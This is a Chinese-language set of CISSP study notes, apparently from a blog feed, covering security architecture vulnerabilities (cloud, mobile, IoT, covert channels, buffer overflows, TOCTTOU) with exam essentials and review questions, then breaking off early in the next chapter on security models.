与聚合类似，推理攻击利用几个非敏感信息片的组合，从而获得对应该属于更高级分类的信息的访问能力。然而，推理要利用人的推断能力，而不是现代数据库平台的简单数学计算能力。与聚合类似，对于推理攻击的最好防范是对赋予个人用户的特权保持持续警隅。此外，数据的故意混淆可能被用来防止对敏感信息的推理。 9.4.3 数据挖掘和数据仓库 数据仓库常常包含生产数据库出于存储限制或数据安全性考虑而通常未予存储的详细历史信息。另一种被称为数据字典的存储类型常常用于存储与数据相关的关键信息，包括用法、类型、源、关系和格式。DBMS软件通过读取数据字典来决定用户访问数据的访问权限。数据挖掘技术准许分析人员对数据仓库进行搜索，从而寻找历史数据中潜在的相关信息。数据挖掘活动产生元数据。元数据是关于数据的数据或关于信息的数据。元数据不完全是数据挖掘操作的结果，其他的功能或服务也可以生成元数据。可以认为元数据是数据挖掘的数据浓缩。它也可以是超集、子集或是大的数据集表示。元数据可以是重要的、有意义的、相关的、异常的或数据集的畸变元素。 数据仓库和数据挖掘技术对于安全专家来说十分重要，这主要有两个原因。首先，前面曾经提到过，数据仓库包含大量潜在的敏感信息，它们容易受到聚合和推理攻击。安全专家必须确保恰当的访问控制，并且采取其他一些安全手段保护数据。其次，在数据挖掘技术被用来开发基于统计异常的入侵检测系统的基准时，实际上可以作为安全工具使用。 9.4.4 数据分析 数据分析是对原始数据进行检查的科学，检查重点是从大量的信息中提取有用的信息。数据分析的结果可以集中于重要的异常值，或正常之外的例外或标准项，或所有数据项的总结，或一些集中的提取和有兴趣信息的组织。随着数据量的增加，数据分析的复杂性也在增加。大数据分析要求在大规模并行或分布式处理系统中进行高性能的分析。在安全方面，众多组织正在努力访问数据并收集范围更广、更为详尽的事件数据。这一数据收集的目标是评估合规性、提高效率、提高生产力、检测违规行为。 9.4.5 大规模并行数据系统 并行数据系统或并行计算是一个计算系统，被设计用于同时进行大量的计算，但并行数据系统往往远远超出了基本的多处理能力。它们通常包括将一个大的任务划分成更小元素的概念，然后将每个子元素分发到不同的子处理系统进行井行计算。大规模并行数据管理在管理大数据上可能是一个关键的工具，井往往涉及云计算、网格计算、对等计算解决方案。 9.5 分布式系统 在完整的主机/终端系统中，分布式体系结构容易出现意想不到的脆弱性。台式机系统可能包含存在泄露风险的敏感信息，因此必须加以保护。单独的用户可能缺乏一般的安全意识，因此内在的体系结构必须弥补这些不足。通信设备也会提供不期望的分布式环境入口点。分布式系统环境要求采取许多防护措施来实现适当的安全性，并确保消除、缓解或补救这些脆弱性。客户端必须受到对其内容及用户内容实施防护措施的策略的约束。 9.5.1 云计算 云计算是虚拟化、互联网、分布式结构以及可随处访问数据和资源的自然延伸和演变。但是，云计算也存在一些问题，包括隐私问题、合规性困难、使用开/闭源解决方案、采用开放标准以及基于云计算的数据是否实际上是安全的(或甚至是可保护的)。这里列出一些云计算的概念： 平台即服务 平台即服务(PaaS)的概念是提供计算平台和软件解决方案作为虚拟的或基于云的服务。从本质上讲，这种类型的云计算解决方案提供了一个平台的所有方面(即操作系统和完整的解决方案)。PaaS的主要吸引力是避免了在本地购买和维护高端的硬件和软件。 软件即服务 软件即服务(SaaS)是PaaS的衍生物。SaaS提供对特定软件应用或套件的按需在线访问而不需要本地安装。在许多情况下，只有很少的本地硬件和操作系统的局限性。SaaS可以实现订阅服务、付费服务或免费服务。 基础设施即服务 基础设施即服务(IaaS)将PaaS模式带到了另一个方向，不但提供了按需操作的解决方案，还提供了完全外包的选择。这可以包括实用或定量的计算服务、管理任务自动化、动态规模、虚拟化服务、政策执行、管理服务和托管的/过滤的互联网连接。最终，IaaS允许企业通过云系统快速扩展新的软件或基于数据的服务/解决方案，而不必在本地安装大量的硬件。 9.5.2 网格计算 网格计算是并行分布处理的一种形式，这种形式松散地把大量的处理节点组合在一起，为实现某个处理目标而工作。网格成员可以在随时的间隙时间进入和离开网格。通常，网格成员只有当它们的处理能力没有本地工作负担的情况下才会加入网格。当系统处于空闲状态时，它可以加入一个网格组，下载一小部分的工作，然后开始计算。当系统离开网格时，它保存任务并可上传己完成或部分的工作成果给网格。 网格计算关心的最大安全问题是每个工作包的内容潜在的完全暴露。许多网格计算项目是完全开放的，所以没有任何限制，谁都可以在本地运行和处理应用程序，并参与网格的项目。这就意味着，网格成员可以保存每个工作包的副本并检查内容。因此，网格项目将不能保持保密性，以及也不适用于隐私、机密或专有数据。 网格计算每时每刻的计算能力都可能发生巨大变化。工作包有时回不来、回来晚或有损坏地返回。这将需要大量的返工，井导致工程在速度、进程、响应上的不稳定性，以及整个项目和每个网格成员的延时。对时间敏感的项目可能因为没有足够的计算时间而不能在指定时间期限内完成任务。 网格计算经常用一台中央核心服务器来管理项目、跟踪工作数据包井整合返回的工作分组。如果中央服务器过载或离线，会发生网格的彻底失败或崩溃。然而，通常当中央网格系统不可访问时，网格成员也可完成它们目前的本地任务，然后定期轮询去发现什么时候中央服务器重新联机。还有一个潜在的风险，就是一台被恶意控制的中央网格服务器可能被利用来攻击网格成员，或欺骗网格成员去执行非网格社区所期望的恶意行为。 9.5.3 点对点 点对点(Peer-To-Peer，P2P)技术是网络和分布式应用手里字的解决方案，用于在点对点实体间共享任务和工作负载。这类似于网格计算，与网格计算的主要区别是： 点对点没有中央管理系统，并且所提供的服务通常是实时的，而不是作为计算能力的集合。 9.6 工业控制系统 工业控制系统(ICS)是一种用于控制工业生产过程和机器的计算机管理设备。有几种ICS种类，包括集散控制系统(DCS)、可编程逻辑控制器(PLC)和数据采集与监控系统(SCADA)。DCS单元负责从单个地点的大型网络环境中收集数据和实施控制。DCS系统的一个重要方面是控制分布在所监测环境中的元件。PLC是有效的单用途或专门用途的数字计算机。它们通常被部署用于各种工业机电自动化管理与操作，如装配线或大规模的数字灯光显示控制系统。SCADA系统可以作为独立的设备使用，也可与其他SCADA系统组成网络或是与传统IT系统组成网络。 9.7 评估和缓解基于Web系统的脆弱性 在基于Web 的系统中有各种各样的应用和系统脆弱性与威胁，并且范围在不断扩大。脆弱性包括涉及XML和SAML，以及许多在开放式Web 应用程序安全项目(OWASP)中讨论的其他问题。 XML利用是一种编程攻击，用来伪造信息并将其发送给访客或导致他们的信息系统在未授权的情况下丢弃信息。对刀在L攻击日益关注的一个领域是安全断言标记语言(SAML)。SAML的滥用往往集中于网络认证。SAML是一种在安全域之间基于XML的组织会话，用于交换通信、认证和授权的细节，通常运行于Web协议之上。SAML通常用来提供基于Web的SSO(Single Sign-On)解决方案。如果攻击者可以伪造SAML通信或窃取访问者的访问令牌，他们就可以绕过认证并获得对网站的未授权访问。 OWASP是一个非营利性的安全项目，其重点在于提高在线或基于Web的应用程序的安全性。OWASP不仅仅是一个组织，也是一个大型社区，可以一起自由地分享信息、方法、工具、更好的编码实践及更安全的架构部署等相关技术。 9.8 评估和缓解移动系统的脆弱性 恶意内部人员可以通过外部不同类型的存储设备把恶意代码带入内部，这些设备包括手机、音频播放器、数码相机、存储卡、光盘和USB 设备。这些存储设备还可以用来泄漏或窃取内部机密和私人数据，以至于泄露到外部恶意的内部人员可以执行恶意代码、访问危险的网站或故意执行有害活动。 9.8.1 设备安全 设备安全可以在一定范围内为移动设备提供潜在的安全选项或功能。不是所有的便携式电子设备σED)都有很好的安全特性。但是，即使设备具有安全功能，但除非它们能被启用和正确配置，否则也是没有价值的。在做出购买决定之前，一定要考虑新设备的安全选项。 全设备加密 远程擦除 锁定 锁屏 GPS 应用控制 存储分隔 资产跟踪 库存控制 移动设备管理 设备访问控制 可移动存储 关闭不使用的功能 9.8.2 应用安全 密钥管理 凭证管理 认证 地理标记 加密 应用自名单 9.8.3 BYOD关注点 BYOD是一项策略，允许员工在工作中携带自己的个人移动设备并使用这些设备连接(或通过)公司网络业务资源和/或互联网。虽然BYOD可以提高员工的士气和工作满意度，但却增加了组织的安全风险。用户需要了解在工作中使用他们自己的设备的好处、限制和后果。阅读并签署BYOD策略，参加回顾和培训计划以具备充足、合理的意识。 数据所有权 所有权支持 补丁管理 反病毒管理 取证 隐私 在线/不在线 遵守公司策略 用户接受 架构/基础设施考虑 法律问题 可接受策略 机载摄像头/视频 9.9 评估和缓解嵌入式设备和物联网系统的脆弱性 嵌入式系统通常围绕与更大的产品相关的一系列有限和特定的功能而进行设计，井成为它的一个组成部分。关于嵌入式系统的另一个类似的概念是静态系统(又名静态环境)。静态环境是一组不改变条件、事件和周边的环境。静态的IT环境可以是任何系统，其用户和管理员的目的是保持环境不变。整个目标是防止或最大程度减少用户可能导致降低安全性或操作功能性的实施变更。在技术上，静态环境是应用手到芋、操作系统、硬件设置或网络被配置为满足特定的需要、能力或功能，然后保持设置不变。然而，尽管使用了”静态”这个术语，但没有真正的静态系统。因为总是存在改变环境的情况，如硬件故障、硬件配置变更、软件缺陷、软件设置的变更或漏洞，最终导致不希望的操作参数和实际上的安全入侵。 9.9.1 嵌入式系统和静态系统的示例 支持网络功能的设备是那些本身有网络功能的便携或非便携设备。 网络物理系统指的是提供一种计算手段来控制物理世界中某样东西的设备。 网络物理系统、嵌入式系统和具备网络功能的设备的一种新扩展是物联网(loT)。物联网是设备的集合，可以通过互联网与其他设备或通过控制台来影响和监视真实世界。 9.9.2 安全方法 嵌入式系统和静态系统的安全问题包括以下事实： 大多数集中在如何最大限度地降低成本和无关的功能上。这往往会导致缺乏安全性且难于升级或安装补丁。由于嵌入式系统在真实世界中是一种控制机制，因此一个安全漏洞可能会造成对人和财产的损害。静态环境、嵌入式系统和其他有限或单一用途的计算环境需要安全管理。虽然它们可能没有广泛的攻击面，并且没有暴露过多的风险，但作为通用的计算机，它们仍然需要适当的安全治理。 网络隔离 安全层 应用防火墙 手动升级 固件版本控制 包装 控制冗余和多样性 9.10 基本安全保护机制9.10.1 技术机制1. 分层法 通过分层法处理，可以实现与用于操作模式的环模型(本章前面讨论过)类似的结构，并且能够应用于每一个操作系统进程。分层法将进程最敏感的功能放在中心，并且用逐渐扩大的同心圆代表敏感度较低的功能(使用稍有不同的方式，有时也采用术语” 较高层” 和”较低层” 进行阐述，从较低层进入较高层时，安全性与特权会被减弱或减少)。层与层之间的通信只能使用定义良好的特定接口，以便提供必要的安全性。来自外部(低敏感度)层的所有入站请求都必须经过严格的身份认证和授权检查，然后才能被允许继续进行(或者在未通过检查的情况下被拒绝)。为安全性使用的分层法类似于使用安全域和格子型安全模型，安全性以及对特定主体和客体的访问控制与指定的层和特权相关联，并且从外部层移至内部层时访问特权会增加。事实上，不同的层只能通过特定的接口进行通信，这种接口被设计用于维护系统的安全性和完整性。即使低安全性的外部层依赖于来自更高安全性的内部层的服务和数据，它们也仍然只知道如何与这些内部层接口，但是对内部层的内部结构、特征或其他细节毫无了解。为了维护层的完整性，内部层既不了解也不依赖于外部层。无论任何一对层之间存在何种安全关系，都不会对对方造成影响(因此每个层都不会遭受其他层的篡改)。最后，外部层不能违反或重写内部层强制实施的任何安全策略。 2. 抽象 抽象是支持面向对象编程的领域的基本原则之一。对象(或操作系统组件)的用户没有必要知道对象的工作细节，而是只需知道使用对象的正确语法和作为结果返回的数据的类型(也就是如何发送输入和接收输出)。这往往涉及对数据或服务的中间访问，就像用户模式中的应用程序使用系统调用请求管理员模式中的服务或数据一样(根据请求者的凭证和特权授予或拒绝这种请求) ，而不是获得直接的、非中间的访问。抽象的另一种安全应用方式引入了对象组(有时也被称为类)，此时访问控制和操作权限被分配给对象组，而不是在每个对象的基础上进行分配。这种方式允许安全管理员方便地定义和命名对象组(通常与作业角色或职责有关)，并且使权限和特权管理变得更为容易(当把对象加入某个类时，就能赋予权限和特权，从而不必单独针对每个对象管理权限和特权) 。 3. 数据隐藏 数据隐藏是多级安全系统的一个重要特征，它能够确保存在于某个安全级别的数据对于运行在不同安全级别的进程来说是不可见的。数据隐藏背后的重要概念是： 保证不必知道在某个级别访问和处理数据所涉及细节的人无法偷偷摸摸地或违法地了解和查看这些细节。从安全性的角度看，数据隐藏依赖于将客体置入不同于主体所占用容器的其他安全容器中，从而对不必对客体细节进行了解的人隐藏相关的细节。 4. 进程隔离 进程隔离要求操作系统为每个进程的指令和数据提供不同的内存空间。此外，还要求操作系统强制实施这些分界，以阻止某一进程读取或写入属于另一个进程的数据。使用进程隔离技术主要有下列两个优点： 阻止未经授权的数据访问。进程隔离是多级安全模式系统的基本要求之一。 保护进程的完整性。如果没有这样的控制措施，那么设计糟糕的进程可能会出现错误，并且将数据写入分配给其他进程的内存空间，从而导致整个系统不稳定，而不仅仅是影响错误进程的执行。在更恶意的情况下，进程可能试图(甚至可能成功)读取或写入超出其处理范围的内存空间、入侵或攻击其他进程。 5. 硬件分隔 硬件分隔的目的与进程隔离类似： 用于阻止对属于不同进程/安全级别的信息的访问。二者的主要差异是：硬件隔离通过使用物理方式的硬件控制措施来强制实施这些要求，而不是通过操作系统强加的逻辑进程隔离控制方法。 9.10.2 安全策略与计算机体系结构 安全策略的角色是告知和指导某些特殊系统的设计、开发、实现、测试和维护。因此，这种安全策略主要关注于单一的实现努力(尽管可能改编自其他类似的实现努力，但是应当尽可能准确和完整地反映目标)。对于系统开发人员而言，安全策略最好通过文档形式定义一组规则、实践和措施，它们描述了系统应当如何管理、保护和分布敏感的信息。阻止信息从较高安全级别流向较低安全级别的安全策略被称为多级安全策略。随着系统开发的进行，应当针对所有适用的系统组件或元素(包括以下全部或其中的一部分： 物理的硬件组件、固件、软件以及组织如何交互和使用系统)设计、构建、实现和测试安全策略。总之，安全考虑应该贯穿项目的整个生命周期，而不是到最后才考虑，否则更容易遭受失败。 9.10.3 策略机制 最小特权原则 特权分离 可问责性 9.11 常见的缺陷和安全问题9.11.1 隐蔽通道 隐蔽通道是用于传递信息的方法，通常不用于通信。因为隐蔽通道的路径通常不用于通信，所以不会受到系统正常安全控制方法的保护。使用隐蔽通道提供了违反、绕过或回避安全策略而不被发现的一种方法。目前存在下列两种基本的隐蔽通道类型： 时间隐蔽通 道通过以一种可预测的方式改变系统组件的性能或更改资源的时间安排来传达信息。使用时间隐蔽通道通常是一种比较复杂的传送数据的方法，并且难以检测。 存储隐蔽通 道通过将数据写入其他进程可以读到的公共存储区域来传达信息。当评估软件安全时，需要注重评估任意进程将信息写入内存中任意位置时，是否可能被其他的进程读取。 这两种隐蔽通道都是依靠使用通信技术与其他未经授权的主体交换信息。因为隐蔽通道的性质是与众不同的，并且位于正常的数据传送环境之外，所以对其进行检测十分困难。针对任何隐蔽通道活动的最佳防护措施是实现审计和分析日志文件。 9.11.2 基于设计或编码缺陷的攻击和安全问题 初始化和失败状态在毫无准备的情况下，系统突然崩愤，接着又重新恢复，这个过程就可能存在两个会危及系统安全控制的机会。许多系统在关机过程中会卸载安全控制。可信恢复能够保证在发生系统崩横时，所有的控制措施都完整无缺。在可信恢复的过程中，系统能确保在安全控制失效的情况下不发生任何访问活动。甚至在系统恢复阶段，所有控制方法都还在完整地运行着。虽然自动恢复过程构成了整个恢复过程的一部分，但是人为的干预仍然是必要的。很显然，如果需要这样的人工操作，那么对执行恢复操作的人员进行适当的身份标识和身份认证同样也是必不可少的。 输入和参数检查缓冲区溢出是一种声名狼蒲的安全破坏行为。在编程人员未能充分验证输入数据时，尤其是在没有对软件接受为输入的数据量进行限制时，就会出现缓冲区溢出。验证数据的有效性是消除缓冲区滋出的唯一方法。一旦发现缓冲区溢出，受影响的系统就必须以常见的方式应用关键的安全更新，从而避免遭受攻击。 维护钩子和特权程序维护钩子程序是只有系统开发人员才知道的系统入口点，这些入口点也被称为后门。后门的最初目的是： 出于维护系统的原因或者在正常的访问由于疏忽导致失效时，能够提供有保证的访问。后门存在的问题是： 这种访问类型避开了所有的安全控制措施，并且为所有知道后门存在的人提供了不受限制的访问。必须明确禁止这些入口点，并且通过监控审计日志来发现那些表明可能是未经授权的管理员访问行为。另一种常见的系统脆弱性是幸自字在执行过程中安全级别被提高的情况。这些程序必须被认真编写和测试，从而不会允许任何出口点和/或入口点存在，以防提高主体的安全级别。确保所有运行在较高安全级别的程序都只能被适当的用户访问，并且这些用户会坚决抵制滥用。 增量攻击某些攻击形式以缓慢的、渐进的增量方式发生，而不是通过明显的或可识别的活动来危害系统的安全性或完整性。当攻击者获得访问系统的权限并且在存储、处理、输入、输出或事务处理期间对数据进行细小的、随机的或增量的改变时(而不是明显地改变文件内容或破坏、删除整个文件)，就会发生数据欺骗。如果没有通过执行加密或某种完整性检查(例如，校验和或消息摘要)并在每次文件读写时都加以应用来保护文件和数据，那么就很难检测这些变化。加密的文件系统、文件级别的加密技术或某些文件监控形式(包括诸如Tripwire 之类的应用程序所执行的完整性检查)通常足以保证不会发生数据欺骗。数据欺骗通常被认为是一种大多由内部人员、很少由外部人员(也就是外部入侵者)进行的攻击。很显然，因为数据欺骗是一种修改数据的攻击，所以我们将其视为主动攻击。 9.11.3 编程 任何不能妥善处理异常的程序都处于不稳定状态的危险之中。程序为了执行正常的任务而提升了自己的安全级别以后，就很有可能导致崩溃。如果攻击者在适当时成功地使程序崩溃，那么他们就能达到较高的安全级别并造成对系统机密性、完整性和可用性的损害。无论是直接执行还是间接执行，所有的程序都必须经过完整的测试以遵从安全模型。确认你所安装的任何软件使用的都是最新版本，并且知道任何己知的安全脆弱性。因为每种安全模型和每种安全策略都是不同的，所以必须确保执行的软件不会超出准许的授权。编写安全代码是很困难的，不过确实是可能的。确保使用的所有程序在设计时都考虑了安全性问题。 9.11.4 计时、状态改变和通信中断 计算机系统执行任务时具有严格的精确度。计算机的优越性在于可重复执行任务。攻击者可以根据任务执行的可预测性来开发攻击程序。常见的算法的事件顺序是先检查可用资源，然后在被准许的情况下进行访问。检查时间(Time Of Check，TOC)是指主体检查客体状态的时间。在返回要访问的客体之前，系统可以做出几种决定。当做出可以访问客体的决定时，程序在使用时间(Time Of Use，TOU)访问客体。在TOC与TOU之间存在的时间差对于攻击者来说是充足的，攻击者能够在这段时间内用另一个符合自己需要的客体来替换原先的客体。检查时间到使用时间(Time-Of-Check-To-Time-Of-Use，TOCTTOU)攻击通常被称为竞争条件，这是由于攻击者与合法的进程进行竞争，从而希望在客体被使用之前对其进行替换。 同样，当资源的状态或整个系统发生改变时，攻击者可以试图在两种己知的状态之间采取行动。通信中断也为攻击者提供了一段可以利用的短暂时间。在资源的状态检查出现在对资源采取行动之前的任何时候，都存在发起潜在攻击的机会窗口。这些攻击必须在安全策略和安全模型中加以解决。TOCTTOU攻击、竞争条件漏洞利用及沟通障碍被称为状态攻击，因为它们攻击一个系统状态过波到另一个状态之间的时差、数据流控制和数据传输。 9.11.5 技术和过程完整性 评估和理解系统架构中的漏洞是很重要的，特别是关于技术和流程的整合方面。由于多种的技术和复杂的过程在规划新的和定制的业务功能时相互交叉，新的问题和安全问题就会显现出来。随着系统的集成，注意力应该放在潜在的单点故障方面，以及面向服务架构(Service-Oriented Architecture，SOA)的紧迫弱点上。SOA构造了新应用或目前没有的功能，而且独立且区别于软件服务。由于应用结果通常是新的; 因此安全问题也是未知的、未经检验的和无保户的。所有新的部署，特别新的应用或函数，需要彻底被审查之后，它们才能被允许进入和运行于生产网络或发布到互联网上。 9.11.6 电磁辐射 因为计算机硬件是由各种电子元件构造而成的，所以许多计算机硬件设备在正常运转的过程中都会放射出电磁辐射(Emit Electromagnetic，EM)。与其他计算机或外围设备进行通信的过程也会产生可能会被拦截的电磁波。通过拦截和处理来自键盘和计算机显示器的电磁辐射，我们甚至有可能重新生成键盘输入或显示器输出的数据。我们也可以被动地(也就是没有真的窃听电缆)检测和读取在网段上经过的网络数据包。这些辐射泄漏可能会引起严重的安全问题，但是通常比较容易解决。消除电磁辐射拦截的最容易方法是，通过电缆屏蔽或放入导管来降低辐射，以及通过物理安全控制方法阻止未授权人员和设备过于靠近设备或电缆。通过降低信号强度和在敏感设备周围增加物理缓冲区，就能够大幅度地减少信号辐射被拦截的风险。 9.12 考试要点 能够解释多任务处理、多线程剑主里、多处理器和多程序设计之间的差异 多任务处理是在一台计算机上同时执行多个应用程序，并由操作系统管理。多线程处理允许在一个进程内执行多个并发任务。多处理器是使用多个处理器以提高计算能力。多F到芋设计与多任务处理类似，但是在大型机系统上使用并且需要特殊的程序设计。 理解单一状态处理器和多态处理器之间的差异 单一状态处理器能够一次只在一个安全级别运行，而多态处理器可以同时在多个安全级别运行。 描述由美国联邦政府认可的用于处理分类信息的4种安全模式 专用系统要求所有用户对在系统中存储的所有信息都具有适当的许可级别、访问特权和”知其所需”要求。系统高级模式则去除了”知其所需” 要求。分隔模式去除了”知其所需”要求和访问特权要求。多级模式则去除了上述所有三个要求。 解释大多数现代处理器使用的两种分层操作模式 用户应用程序在有限的指令集环境中运行，这被称为用户模式。操作系统在特权模式下执行受控的操作，这种模式也被称为系统模式、内核模式和监管模式。 描述计算机使用的不同存储器类型 ROM是非易失性的，并且终端用户无法写入数据。PROM芯片仅允许终端用户写入一次数据。通过紫外线光照射可以擦除EPROM芯片中的数据，然后再重新写入数据。可以用电流擦除EEPROM芯片中的数据，然后再重新写入数据。RAM芯片是易失性的，当计算机的电源被切断后，芯片中的内容会丢失。 了解有关存储器组件的安全问题 目前有三种主要的安全问题与存储器组件有关： 电源切断后，数据仍有可能保留在芯片上：存储器芯片容易被盗; 在多用户系统中控制对存储器的访问。 描述计算机使用的存储设备的不同特征 主存储设备与存储器相同。辅助存储设备有磁性和光学介质两种，在CPU能够使用这些数据之前，先要将数据读入主存储器。随机存取存储设备可以在任何位置读取数据，然而顺序存取存储设备需要扫描物理存储的所有数据后才能到达指定的位置。 了解有关辅助存储设备的安全问题 目前有三个与辅助存储设备有关的安全问题： 可移动介质能够被用于窃取数据;必须应用访问控制和加密技术来保护数据;即使在删除文件或格式化介质后，数据也仍可能保留在介质上。 理解输入和输出设备会带来的安全风险 输入输出设备会遭到偷听和窃听(能够将数据偷带出组织，还能够创建可以进入组织系统和网络的未授权、不安全的入口点)。一定要能够识别和缓解这些脆弱性。 理解I/O地址、配置和设置 操作传统PC设备要求对IRQ、DMA和存储映射I/O有一定了解。要准备好识别和处理潜在的地址冲突和错误配置，井且能够集成传统设备与即插即用(PnP)组件。 理解使用固件的目的 固件是被存储到ROM芯片上的软件。在计算机层次上，固件包含了启动计算机所需的基本指令。固件还被用于在外围设备(如打印机)中提供操作指令。 能够描述进程隔离、分层法、抽象、数据隐藏和硬件分隅 进程隔离能够确保进程只能访问它们自己的数据。分层法在一个进程内创建不同的安全域并限制彼此之间的通信。抽象能够在不要求了解算法或设备内部工作原理的情况下生成”黑箱”接口。数据隐藏阻止信息被来自不同安全级别的进程读取。硬件分隔使用物理控制措施实现进程的隔离。 理解安全策略如何帮助完成系统的设计、实现、测试和部署 安全策略的作用是通知和指导某些特定系统的设计、开发、实现、测试和维护。 理解云计算 云计算是一个流行的术语，指的是一个计算的概念，即处理和存储是通过网络连接到其他地方运行而不是在本地运行。云计算通常被认为是基于互联网的计算。 理解移动设备的安全 设备安全涉及为移动设备提供可以利用的潜在安全选择或功能范围。不是所有的便携式电子设备(PED)都有好的安全特性。PED安全功能包括整个设备的加密、远程擦除、锁定、锁屏、GPS、应用控制、存储分隔、资产跟踪、目录控制、移动设备管理、设备访问控制、移动存储和禁用未使用的功能。 理解移动设备应用安全 在移动设备上使用的应用程序和功能需要被保护。相关概念包括密钥管理、证书管理、身份认证、地理标记、加密、应用自名单和可传递的信任/认证。 理解BYOD 自带设备(BYOD)是一项策略，允许员工携带自己的个人移动设备进行工作，然后使用这些设备来连接(或穿过)公司网络的业务资源和/或互联网。虽然BYOD可以提高员工士气和工作满意度，但却增加了组织的安全风险。相关问题包括数据所有权、所有权支持、补丁管理、防病毒管理、取证、隐私、登录/关闭登录、企业策略的一致性、用户接受、架构/基础设施的考虑、法律问题、可接受的使用策略以及机载摄像机/视频。 理解嵌入式系统和静态环境 嵌入式系统通常相对于较大的产品来说只是其中一个组件，通常被设计围绕着一组有限的特定功能。静态环境是应用程序、操作系统、硬件集合或为了特殊需求、能力或功能而配置的网络，然后设置为保持不变。 理解嵌入式系统和静态环境下的安全问题 静态环境、嵌入式系统和其他有限或单一用途的计算环境需要安全管理。这些技术包括网络分隔、安全层、应用防火墙、手动更新、固件版本控制、包装、控制冗余和多样性。 理解如何在计算机体系结构中应用最小特权、特权分离和可问责性 最小特权原则确保只有少量进程被授权在监管模式下运行。特权分离增加了安全操作的粒度。可问责性确保可以使用审计跟踪追溯到操作源。 能够解释什么是隐蔽通道 隐蔽通道是用于传送信息的任何方法，但是通常不用于信息通信。 理解什么是缓冲区溢出和输入检查 当编程人员在将数据写入特定内存地址之前没有检查输入数据的大小时，就可能会发生缓冲区溢出。事实上，对输入数据有效性的任何验证失败都会导致安全性受到破坏。 描述安全体系结构的常见缺陷 除了缓冲区溢出以外，编程人员在部署系统后还会留下后门和特权程序。即使设计良好的系统也可能遭到TOCTTOU 攻击。任何状态改变都为攻击者提供了危及系统安全的潜在机会。 9.14 复习题 许多PC 操作系统提供一个功能，这个功能使它们能够支持单处理器系统中的多个应用程序同时执行。什么术语用于描述这种能力?A. 多程序B. 多线程C. 多任务D. 多处理器 什么技术为组织提供对BYOD设备的最佳控制?A. 应用自名单B. 移动设备管理C. 加密移动存储D. 地理标记 你有三个应用程序在支持多任务处理的单核单处理器系统上运行。这些应用程序的其中一个为文字处理程序，并同时管理两个线程。其他两个应用军到芋只使用一个线程来运行。在任何给定时间有多少个应用线程在处理器上运行?A. 1B. 2C. 3D. 4 什么类型的美国联邦政府计算机系统要求所有访问系统的个人都需要知道所有由该系统处理的信息?A. 专用模式B. 系统高级模式C. 间隔模式D. 多级模式 在标准PC中不常被发现而嵌入式系统中有的安全风险是什么?A. 软件缺陷B. 访问互联网C. 在物理环境中的控制机制D. 电源丢失 什么类型的内存芯片允许最终用户仅能写入信息到内存中一次，然后永久地保存这些不可能擦除的信息?A. ROMB. PROMC. EPROMD. EEPROM 什么类型的内存芯片，当从计算机中取出并暴露在一种特殊类型的紫外光下之后，信息仅会被擦除?A. ROMB. PROMC. EPROMD. EEPROM 以下哪种类型的内存可能会保留从计算机中取出后的信息，因此也代表了安全风险?A. 静态RAMB. 动态RAMC. 辅助存储器D. 物理内存 减少移动设备上的数据丢失风险的最有效手段是什么，例如笔记本电脑?A. 设置强登录密码B. 减少存储在移动设备上的敏感数据C. 使用一根电缆线D 加密硬盘 什么类型的电气部件作为构建动态RAM 芯片的主要部分?A. 电容器B. 电阻器C. 触发器D. 晶体管 下面存储设备中的哪一个为了在网络环境中保持数据安全性，最有可能需要加密技术?A. 硬盘B. 备份磁带C. 可移动设备D. RAM 在下列哪种安全模式中，你会放心所有用户都具有通过系统处理所有信息的访问权限，但不必知道所有的信息?A. 专用模式B. 系统高级模式C. 间隔模式D. 多级模式 移动电话窃听最常被忽视的方面与下列哪些情形有关?A. 存储设备加密B. 锁屏C. 偷昕通话D. 无线网络 什么类型的存储设备通常用于包含一台计算机的主板BIOS?A. PROMB. EEPROMC. ROMD. EPROM 什么类型的存储直接提供给CPU，并且往往是CPU的一部分?A. RAMB. ROMC. 寄存器D. 虚拟内存 什么类型的寻址方案是数据实际提供给CPU作为参数传递给指令?A 直接寻址B. 立即寻址C. 基址偏移D. 间接寻址 什么类型的寻址方案支持本地CPU包含实际计算的内存地址?A. 直接寻址B. 立即寻址C. 基址偏移D. 间接寻址 哪些安全原则有助于阻止用户访问分配给其他用户用以运行应用程序的内存空间?A. 特权分离B. 分层C. 进程隔离D. 最小特权 哪些安全原则授权只有最小数量的操作系统进程时可以在监管模式下运行?A. 抽象B. 分层C. 数据隐藏D. 最小特权 哪些安全原则采用进程隔离的概念和使用物理控制来实现?A. 硬件分隔B. 数据隐藏C. 分层D. 抽象]]></content>
      <categories>
        <category>notes</category>
      </categories>
      <tags>
        <tag>cissp</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cissp学习笔记（8）——安全模型的原则、设计和功能]]></title>
    <url>%2Fnotes%2Fcissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%888%EF%BC%89%E2%80%94%E2%80%94%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8E%9F%E5%88%99%E3%80%81%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[在本章的考试大纲内容有：3)安全工程(安全的工程学和管理) A. 使用安全设计原则实施和管理工程过程 B. 理解安全模型的基本概念(例如，机密性、完整性和多级模型) C. 根据系统安全评价模型选择控制与对策 D. 理解信息系统的安全保障能力(例如，内存保护、虚拟化、信任平台模型、接口、故障容错) 8.1 使用安全设计原则实施和管理工程过程 在每一个系统的开发阶段都应该考虑安全，程序员应该努力为他们开发的每一个应用手固芋建立安全，提供更高层次的安全性给关键应用程序和那些处理敏感信息的应用程序。在开发项目的早期阶段考虑安全是非常重要的，因为它比将安全添加到现有系统中更容易实现。 8.1.1 客体和主体 对安全系统中任何资源的访问控制涉及两个实体。主体是请求访问资源的用户或进程。访问的意思是可以对资源进行读或写操作。客体是用户或进程想要访问的资源。 8.1.2 封闭式系统和开放式系统 封闭式系统被设计用于与较小范围内的其他系统协同工作，通常所有系统都来自相同的制造厂商。封闭式系统的标准一般是专有的，通常不对外公开。另一方面，开放式系统被设计为使用统一的行业标准。这些开放式系统比较容易与来自不同制造厂商但支持相同标准的系统集成在一起。封闭式系统很难与不同的系统集成在一起，但是它们更为安全。封闭式系统通常由专用硬件和软件组成，这些软硬件是不符合行业标准的。缺乏容易集成的特点，意味着针对许多普通系统组件的攻击可能不起作用，或者这些攻击需要经过定制才能成功。 8.1.3 用于确保机密性、完整性和可用性的技术 